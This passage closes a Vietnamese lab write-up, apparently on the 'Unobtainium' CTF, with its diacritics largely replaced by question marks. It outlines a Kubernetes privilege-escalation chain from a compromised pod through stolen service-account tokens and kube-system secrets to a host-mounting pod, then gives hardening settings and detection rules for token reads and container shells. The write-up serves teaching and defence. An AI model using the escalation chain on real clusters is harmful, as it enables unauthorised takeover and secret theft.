Unobtainium minh h?a r?t rõ m?t chu?i leo thang ki?u th?c t?:

```text
Pod compromise
? d?c ServiceAccount token
? ki?m tra RBAC t?ng namespace
? tìm namespace có quy?n khác thu?ng
? pivot sang workload khác
? l?y token m?i
? d?c secrets nh?y c?m
? chi?m ServiceAccount admin
? t?o pod d?c h?i
? host filesystem access
```

Các l?i c?u hình chính:

- Pod du?c t? d?ng mount ServiceAccount token dù app không ch?c c?n g?i API Server.
- ServiceAccount `default` có quy?n list namespace và list pods ? `dev`, giúp attacker khám phá lateral movement path.
- ServiceAccount ? `dev` có quy?n `get/list secrets` trong `kube-system`, dây là quy?n c?c k? nguy hi?m.
- Secret ki?u `kubernetes.io/service-account-token` ch?a token có th? dùng ngay d? impersonate ServiceAccount tuong ?ng.
- Không có policy ch?n pod mount `hostPath: /`.

### 15. Hardening / Detection

Hardening nên ghi vào báo cáo:

- Không dùng ServiceAccount `default` cho workload th?t.
- T?t mount token n?u app không c?n:

```yaml
automountServiceAccountToken: false
```

- RBAC least privilege theo namespace, không c?p `get/list secrets` tr? khi th?t s? c?n.
- Tuy?t d?i h?n ch? quy?n d?c secrets trong `kube-system`.
- Dùng short-lived bound tokens thay vì long-lived ServiceAccount token secret n?u có th?.
- B?t Pod Security Admission/Kyverno/Gatekeeper d? ch?n:
  - `hostPath` mount `/`
  - `hostNetwork: true`
  - `privileged: true`
  - pod ch?y root không c?n thi?t
- Audit API Server cho các hành vi:
  - `get/list secrets` trong `kube-system`
  - `describe/get secret *-token-*`
  - t?o pod m?i có `hostPath`
  - `kubectl exec` b?t thu?ng
- Falco/Tetragon rule nên chú ý:
  - Process trong container d?c `/run/secrets/kubernetes.io/serviceaccount/token`.
  - Container mount host root filesystem.
  - Shell du?c spawn trong container ?ng d?ng.

### 16. Takeaway

Unobtainium là ví d? hay hon SteamCloud cho ph?n **leo thang d?c quy?n theo chu?i RBAC**. Attacker không có quy?n admin ngay t? d?u, nhung b?ng cách d?c token trong pod, ki?m tra quy?n theo t?ng namespace, pivot sang pod khác và l?m d?ng quy?n d?c secrets trong `kube-system`, cu?i cùng v?n l?y du?c token admin và t?o pod mount filesystem host.



## K?t thúc 

Thì dây là các bài lab mà tui h?c du?c trong quá trình tìm hi?u v? ki thu?t khai thác leo thang d?c quy?n trên K8s , thì ch? y?u d?u khai thác do misconfig và l?i RBAC c?p quy?n quá r?ng. Qua dó có th? th?y r?ng n?u trong môi tru?ng th?c t? , các l? h?ng dôi khi không d?n t? các zero-day mà d?n t? b?n thân con ngu?i. Hôm nay t?i dây thui, h?n các b?n ? bài s?p t?i !!!!.




